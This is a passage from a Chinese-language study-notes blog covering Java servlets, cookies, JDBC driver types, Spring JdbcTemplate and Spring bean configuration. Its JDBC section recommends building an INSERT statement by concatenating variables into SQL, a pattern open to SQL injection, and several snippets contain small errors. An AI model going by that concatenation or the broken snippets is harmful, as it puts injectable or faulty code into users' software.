class="string">"/anotherURL"</span>);</span><br></pre></td></tr></table></figure><p>于servlet链接相反，这种简单的重定向不会将HttpRequest对象传递到目标地址</p><h3 id="Servlet编写和读取cookie"><a href="#Servlet编写和读取cookie" class="headerlink" title="Servlet编写和读取cookie"></a>Servlet编写和读取cookie</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"sessionId"</span>,<span class="string">"123456789"</span>);</span><br><span class="line">cookie.setHttpOnly(<span class="keyword">true</span>);</span><br><span class="line">cookie.setMaxAge(-<span class="number">30</span>);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>响应HttpServletResponse 传递给doXXX()方法的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies = request.getCookies();</span><br><span class="line"><span class="keyword">for</span>(Cookie cookie : cookies)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//cookie.getName();</span></span><br><span class="line">    <span class="comment">//cookie.getValue()</span></span><br><span class="line">&#125;  <span class="comment">//回读服务器父项上的cookie信息</span></span><br></pre></td></tr></table></figure><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="驱动程序"><a href="#驱动程序" class="headerlink" title="驱动程序"></a>驱动程序</h3><p>四种类型驱动程序</p><ul><li>JDBC-ODBC桥驱动程序  //有纯Java驱动程序替代的话，不建议此</li><li>本机API驱动程序</li><li>所有Java+中间件翻译驱动程序</li><li>纯Java驱动程序</li></ul><h4 id="本机API驱动程序"><a href="#本机API驱动程序" class="headerlink" title="本机API驱动程序"></a>本机API驱动程序</h4><p>JDBC驱动程序类似于类型1驱动程序，不同之处在于<strong>ODBC部分被替换为本机代码部分</strong>。本机代码部分针对特定的数据库产品，即使用数据库产品的客户端库。驱动程序将JDBC方法调用转换为数据库本机API的本机调用。</p><p>这种体系结构消除了对ODBC驱动程序的需求，而直接称为数据库供应商提供的本机客户端库。数据库供应商很快就采用了这种方法，因为它可以快速，廉价地实现，因为他们可以重用现有的基于C / C ++的本机库。</p><h4 id="所有Java-中间件翻译驱动程序"><a href="#所有Java-中间件翻译驱动程序" class="headerlink" title="所有Java+ 中间件翻译驱动程序"></a>所有Java+ 中间件翻译驱动程序</h4><p> JDBC驱动程序是一种全Java驱动程序，它将<strong>JDBC接口调用发送到中间服务器</strong>。然后，中间服务器代表JDBC驱动程序连接到数据库。中间层（应用程序服务器）将JDBC调用直接或间接转换为供应商特定的数据库协议。</p><p>Type 3驱动程序试图成为100％Java解决方案，但并没有真正获得太大的吸引力。Type 3驱动程序具有Java客户端组件和Java Server组件，后者实际上是在与数据库对话。尽管从技术上讲这是一个完整的Java解决方案，但是数据库供应商不喜欢这种方法，因为这种方法成本高昂–他们将不得不重写全部为C / C ++的本机客户端库。另外，这并没有提高体系结构的效率，因为我们实际上仍然是3层体系结构，因此很容易看出为什么它从来都不是流行的选择。</p><p><img src="../images/java_web/JDBC-driver-type-3.png" alt="JDBC驱动程序类型3"></p><h4 id="纯Java驱动程序"><a href="#纯Java驱动程序" class="headerlink" title="纯Java驱动程序"></a>纯Java驱动程序</h4><p><img src="../images/java_web/JDBC-driver-type-4.png" alt="JDBC驱动程序类型4"></p><p>JDBC 4类驱动程序，也称为直接数据库纯Java驱动程序，是一种数据库驱动程序实现，可<strong>将JDBC调用直接转换为特定于供应商的数据库协议</strong>。它是针对特定数据库产品实现的。如今，大多数JDBC驱动程序都是4类驱动程序。</p><p>Type 4驱动程序完全用Java编写，因此与平台无关。它们安装在客户端的Java虚拟机内部。这提供了比类型1和类型2驱动程序更好的性能，因为它没有将调用转换为ODBC或数据库API调用的开销。与类型3驱动程序不同，它不需要关联的软件即可工作。</p><p>该体系结构将整个JDBC API实现以及用于直接与数据库通信的所有逻辑封装在<br>单个驱动程序中。通过在100％java程序包中都包含一个单独的层和一个小的驱动程序，这可以简化部署并简化开发过程。</p><p>例如，这种类型包括广泛使用的Oracle瘦驱动程序。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>java使用Stament对象使用execute()方法传递sql语句时，sql语句用的是” “ 字符串式，所以在用value传递参数时，不能直接将id，age这样的变量直接使用</p><p>需要 ‘“+id +”‘,’”user”  这样的形式将变量传递进，否则则将传进空值 </p><p>jdbc中insert语句 例</p><p>或者用字符串拼接的方法传递参数，例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statement.execute(String.format(<span class="string">"INSERT INTO employees(id,age,first,last)"</span>+<span class="string">"VALUES('"</span>+ id +<span class="string">"', '"</span>+age +<span class="string">"','"</span>+first +<span class="string">"','"</span>+last+<span class="string">"')"</span>));</span><br></pre></td></tr></table></figure><p>注意VALUE 前有双引号，一条语句分开 双引号 </p><h3 id="Spring-中JdbcTemplate-类"><a href="#Spring-中JdbcTemplate-类" class="headerlink" title="Spring 中JdbcTemplate 类"></a>Spring 中JdbcTemplate 类</h3><p>JDBC模板类执行SQL查询,更新语句,存储过程调用 , 对ResultSet执行迭代并提取返回的参数值, 它还捕获JDBC异常并将其转换为org.springframework.dao包中定义的通用,信息量更大的异常层次结构 </p><p>配置后, JdbcTemplate类的实例时线程安全的,因此,可以配置JdbcTemplate 的单个实例,然后安全地将此共享引用注入到多个DAO中</p><p>需要为JDBC模板提供一个数据源, 使得它可以对其进行配置以获取数据库访问权限, 可以是在XML文件中配置DataSource ,</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"dataSource"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">class</span> = <span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"driverClassName"</span> <span class="attr">value</span> = <span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"url"</span> <span class="attr">value</span> = <span class="string">"jdbc:mysql://localhost:3306/TEST"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"username"</span> <span class="attr">value</span> = <span class="string">"root"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"password"</span> <span class="attr">value</span> = <span class="string">"password"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span></span></span><br></pre></td></tr></table></figure><h4 id="数据访问对象-DAO"><a href="#数据访问对象-DAO" class="headerlink" title="数据访问对象(DAO)"></a>数据访问对象(DAO)</h4><p>DAO代表数据访问对象,通常用于数据库交互,DAO的存在</p><p>执行sql语句</p><p>查询整数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String Sql = <span class="string">"select count(*) from Student"</span>;<span class="string">'</span></span><br><span class="line"><span class="string">int rowCount = jdbcTemplateObject.queryForInt(Sql);</span></span><br></pre></td></tr></table></figure><p><strong>查询很长时间</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String SQL = <span class="string">"select count(*) from Student"</span><span class="comment">;</span></span><br><span class="line">long rowCount = jdbcTemplateObject.queryForLong( SQL )<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>使用绑定变量的简单查询</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "select age from Student where id = ?";</span><br><span class="line"><span class="type">int</span> age = jdbcTemplateObject.queryForInt(<span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="number">10</span>&#125;);</span><br></pre></td></tr></table></figure><p><strong>查询字符串</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span> SQL = <span class="string">"select name from Student where id = ?"</span>;</span><br><span class="line"><span class="built_in">String</span> name = jdbcTemplateObject.queryForObject(SQL, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="number">10</span>&#125;, <span class="built_in">String</span><span class="class">.<span class="keyword">class</span>);</span></span><br></pre></td></tr></table></figure><p><strong>查询和返回对象</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> SQL = <span class="string">"select * from Student where id = ?"</span>;</span><br><span class="line">Student student = jdbcTemplateObject.queryForObject(</span><br><span class="line">   SQL, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="number">10</span>&#125;, <span class="keyword">new</span> <span class="type">StudentMapper</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentMapper</span> <span class="keyword"><span class="keyword">implements</span> <span class="type">RowMapper</span></span>&lt;<span class="title">Student</span>&gt; </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123;</span><br><span class="line">      Student student = <span class="keyword">new</span> <span class="type">Student</span>();</span><br><span class="line">      student.setID(rs.getInt(<span class="string">"id"</span>));</span><br><span class="line">      student.setName(rs.getString(<span class="string">"name"</span>));</span><br><span class="line">      student.setAge(rs.getInt(<span class="string">"age"</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> student;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>查询并返回多个对象</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String SQL = <span class="string">"select * from Student"</span>;</span><br><span class="line">List&lt;Student&gt; students = jdbcTemplateObject.query(</span><br><span class="line">   SQL, <span class="keyword">new</span> <span class="constructor">StudentMapper()</span>);</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> StudentMapper implements RowMapper&lt;Student&gt; &#123;</span><br><span class="line">   public Student map<span class="constructor">Row(ResultSet <span class="params">rs</span>, <span class="params">int</span> <span class="params">rowNum</span>)</span> throws SQLException &#123;</span><br><span class="line">      Student student = <span class="keyword">new</span> <span class="constructor">Student()</span>;</span><br><span class="line">      student.set<span class="constructor">ID(<span class="params">rs</span>.<span class="params">getInt</span>(<span class="string">"id"</span>)</span>);</span><br><span class="line">      student.set<span class="constructor">Name(<span class="params">rs</span>.<span class="params">getString</span>(<span class="string">"name"</span>)</span>);</span><br><span class="line">      student.set<span class="constructor">Age(<span class="params">rs</span>.<span class="params">getInt</span>(<span class="string">"age"</span>)</span>);</span><br><span class="line">      </span><br><span class="line">      return student;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在表格中插入一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "insert into Student (name, age) values (?, ?)";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"Zara", <span class="number">11</span>&#125; );</span><br></pre></td></tr></table></figure><p><strong>更新表中的一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "update Student set name = ? where id = ?";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"Zara", <span class="number">10</span>&#125; );</span><br></pre></td></tr></table></figure><p><strong>从表格中删除一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "delete Student where id = ?";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="number">20</span>&#125; );</span><br></pre></td></tr></table></figure><p>执行DDL语句</p><p>您可以使用<em>jdbcTemplate中</em>的<strong>execute（..）</strong>方法执行任何SQL语句或DDL语句。以下是使用CREATE语句创建表的示例-</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String SQL = "<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student( <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span><span class="keyword">ID</span>   <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span><span class="keyword">NAME</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span>AGE  <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span>PRIMARY <span class="keyword">KEY</span> (<span class="keyword">ID</span>));"</span><br><span class="line"></span><br><span class="line">jdbcTemplateObject.execute( <span class="keyword">SQL</span> );</span><br></pre></td></tr></table></figure><h2 id="从Spring开始学SpringBoot"><a href="#从Spring开始学SpringBoot" class="headerlink" title="从Spring开始学SpringBoot"></a>从Spring开始学SpringBoot</h2><p>Spring的环境配过并解决了一些问题，但仅运行了hello boot 的示例程序</p><p>因为没有系统的学习spring，仅仅听了一遍视频，没有任何记忆，所以参考学习网站将Spring的一些基础知识点系统学习并进行记录</p><h3 id="bean-标签的使用"><a href="#bean-标签的使用" class="headerlink" title="bean 标签的使用"></a>bean 标签的使用</h3><h4 id="bean使用的第一个example程序"><a href="#bean使用的第一个example程序" class="headerlink" title="bean使用的第一个example程序"></a>bean使用的第一个example程序</h4><p><bean>中的bean id 返回调用类的对象，并使用 <property/>标签为变量传递值</p><p>例 HelloSpring类为 bean标签内的类  bean id返回HelloSpring类对象传递给HelloSpring variable_name</p><p>variable_name将可以调用HelloSpring类中方法</p><p>bean id标签通过类内函数为类成员变量赋值</p><p><img src="../images/java_web/image-20210403204446620.png" alt="image-20210403204446620"></p><p><img src="../images/java_web/image-20210403204453493.png" alt="image-20210403204453493"></p><p>message将赋值为”Hello Spring”</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>构成应用程序主干并由Spring IoC容器管理的对象成为bean，Bean是由Spring IoC容器示例化，组装和以其他方式管理的对象。</p><p>属性和说明</p><table><thead><tr><th>序号</th><th>属性和说明</th></tr></thead><tbody><tr><td>1  class 类</td><td>必须的，用于指定创建Bean的类</td></tr><tr><td>2 name 姓名</td><td>此属性唯一地指示Bean标识符。在基于XML的配置元数据中，使用id和/或name属性来指定Bean 标识符</td></tr><tr><td>3 scope 范围</td><td>指定从特定bean 定义创建的对象的范围</td></tr><tr><td>4 constructor-arg 构造函数</td><td></td></tr><tr><td>5 properties 特性</td><td></td></tr><tr><td>6 autpwiring mode 自动连线模式</td><td></td></tr><tr><td>7 lazy-initalization mode 延迟初始化模式</td><td></td></tr><tr><td>8 initalization mehtod 初始化方法</td><td>容器设置完Bean的所有必须属性后，将调用此回调</td></tr><tr><td>9 destruction mehtod 销毁方法</td><td></td></tr></tbody></table><h4 id="Scopes"><a href="#Scopes" class="headerlink" title="Scopes"></a>Scopes</h4><p>强制Spring每次需要一个新的bean实例时，将scope属性声明为prototype，</p><p>Spring每次需要一个实例时都返回一个实例时都返回相同的bean实例，则scope属性声明为singleton</p><table><thead><tr><th>Sr.No.</th><th>Scope &amp; Description</th></tr></thead><tbody><tr><td>1</td><td><strong>singleton</strong>This scopes the bean definition to a single instance per Spring IoC container (default).</td></tr><tr><td>2</td><td><strong>prototype</strong>This scopes a single bean definition to have any number of object instances.</td></tr><tr><td>3</td><td><strong>request</strong>This scopes a bean definition to an HTTP request. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr><tr><td>4</td><td><strong>session</strong>This scopes a bean definition to an HTTP session. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr><tr><td>5</td><td><strong>global-session</strong>This scopes a bean definition to a global HTTP session. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr></tbody></table><h5 id="单例范围"><a href="#单例范围" class="headerlink" title="单例范围"></a>单例范围</h5><p>如果将范围设置为单例，则Spring IoC容器将创建该bean定义所定义的对象的一个实例。该单个实例存储在此类单例bean的高速缓存中，并且对该命名bean的所有后续请求和引用都返回该高速缓存的对象。</p><h4 id="bean生命周期"><a href="#bean生命周期" class="headerlink" title="bean生命周期"></a>bean生命周期</h4><p>定于bean的setup and teardown ，使用initmethod和/或destroy-method参数声明<bean></p><h5 id="初始化回调"><a href="#初始化回调" class="headerlink" title="初始化回调"></a>初始化回调</h5><p>org.springframework.beans.factory.InitializingBean接口指定一个方法-</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure><p>可以创建一个类去实现Initializing。并且可以在afterPropertiesSet()方法内部完成初始化工作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleBean</span> <span class="keyword">implements</span> <span class="title">InitializingBean</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// do some initialization work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于基于XML的配置元数据，可以使用init-method属性指定具有无效无参数签名的方法的名称</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"exampleBean"</span> <span class="attr">class</span> = <span class="string">"examples.ExampleBean"</span> <span class="attr">init-method</span> = <span class="string">"init"</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleBean</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//do some initialization work</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="销毁回调"><a href="#销毁回调" class="headerlink" title="销毁回调"></a>销毁回调</h5><p>所述<em>org.springframework.beans.factory.DisposableBean</em>接口指定一个单一的方法-</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure><p>因此，您可以简单地实现上述接口，并且可以在destroy（）方法内完成终结工作，如下所示：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">ExampleBean</span> <span class="symbol">implements</span> <span class="symbol">DisposableBean</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">void</span> destroy() &#123;</span><br><span class="line">      <span class="comment">// do some destruction work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于基于XML的配置元数据，可以使用<strong>destroy-method</strong>属性指定具有无效无参数签名的方法的名称。例如-</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attr">id</span> = <span class="string">"exampleBean"</span> <span class="attr">class</span> = <span class="string">"examples.ExampleBean"</span> <span class="attr">destroy-method</span> = <span class="string">"destroy"</span>/&gt;</span><br></pre></td></tr></table></figure><p>以下是类定义-</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">ExampleBean</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">void</span> destroy() &#123;</span><br><span class="line">      <span class="comment">// do some destruction work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非Web应用程序环境中使用Spring的Ioc容器，不建议使用InitiazingBean或DisposableBean，因为XML文件配置在命名方法方法具有很大的灵活性</p><p>示例程序</p><p>HelloSpring 类中</p><p><img src="../images/java_web/image-20210404091623731.png" alt="image-20210404091623731"></p><p>MainApp 类中内容</p><p><img src="../images/java_web/image-20210404091351005.png" alt="image-20210404091351005"></p><p>bena中配置</p><p><img src="../images/java_web/image-20210404091721445.png" alt="image-20210404091721445"></p><p> 默认的初始化和销毁方法</p><p>如果您有太多具有相同名称的初始化和/或销毁方法的bean，则无需在每个单独的bean上声明<strong>init-method</strong>和<strong>destroy-method</strong>。相反，该框架提供了灵活性，可以使用<beans>元素上的<strong>default-init-method</strong>和<strong>default-destroy-method</strong>属性配置这种情况，如下所示-</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns = <span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">   xmlns:xsi = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">   xsi:schemaLocation = <span class="string">"http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span></span><br><span class="line">   <span class="keyword">default</span>-init-method = <span class="string">"init"</span> </span><br><span class="line">   <span class="keyword">default</span>-destroy-method = <span class="string">"destroy"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;bean id = <span class="string">"..."</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>&gt;</span><br><span class="line">      &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="keyword">this</span> bean go here --&gt;</span><br><span class="line">   &lt;/bean&gt;</span><br><span class="line">   </span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h4 id="bean-Post-Processors"><a href="#bean-Post-Processors" class="headerlink" title="bean Post Processors"></a>bean Post Processors</h4><p>BeanPostProcesser的接口定义回调方法，你可以实现提供自己的实例化逻辑</p><p>可以配置多个BeanPostProcesser接口，并且可以通过设置BeanProProcesser实现Ordered接口的order属性来控制这些BenPostProcesser接口的执行顺序</p><p>BeanPostProcessor在Bean（或对象）实例上运行，Spring IoC容器实例化bean实例，然后BeanPostProcessor接口完成其工作。</p><p>一个<strong>ApplicationContext的</strong>自动检测与该执行中定义的任何bean<strong>的BeanPostProcessor</strong>接口，并注册这些豆类如后处理器，被然后通过在容器创建bean的适当调用。</p><p><img src="../images/java_web/image-20210404094704632.png" alt="image-20210404094704632"></p><p><img src="../images/java_web/image-20210404094717165.png" alt="image-20210404094717165"></p><h4 id="Spring-Bean定义继承"><a href="#Spring-Bean定义继承" class="headerlink" title="Spring-Bean定义继承"></a>Spring-Bean定义继承</h4><p>从父定义继承配置数据，自定义根据需要覆盖某些值，或添加其他值</p><p><img src="../images/java_web/image-20210404123441729.png" alt="image-20210404123441729"></p><p>可以创建一个Bean定义模板，该模板由其它子bean定义使用，在定义Bean定义模板时，不应指定class属性，而应指定abtract属性 并且指定值为true的abstract属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"beanTeamplate"</span> <span class="attr">abstract</span> = <span class="string">"true"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message1"</span> <span class="attr">value</span> = <span class="string">"Hello World!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message2"</span> <span class="attr">value</span> = <span class="string">"Hello Second World!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message3"</span> <span class="attr">value</span> = <span class="string">"Namaste India!"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"helloIndia"</span> <span class="attr">class</span> = <span class="string">"com.tutorialspoint.HelloIndia"</span> <span class="attr">parent</span> = <span class="string">"beanTeamplate"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message1"</span> <span class="attr">value</span> = <span class="string">"Hello India!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message3"</span> <span class="attr">value</span> = <span class="string">"Namaste India!"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父bean不能单独实例化，因为它是不完整的，而且还被明确标记为abstract，这样的定义很抽象时，它只能用作纯模板定义，用作自定义的父定义</p><h4 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h4><p>写复杂的应用程序时，应用程序类应尽可能独立于其它Java类， 依赖注入（或有时成为接线）有助于将这些类粘合在一起，同时保持他们的独立性</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> SpellChecker 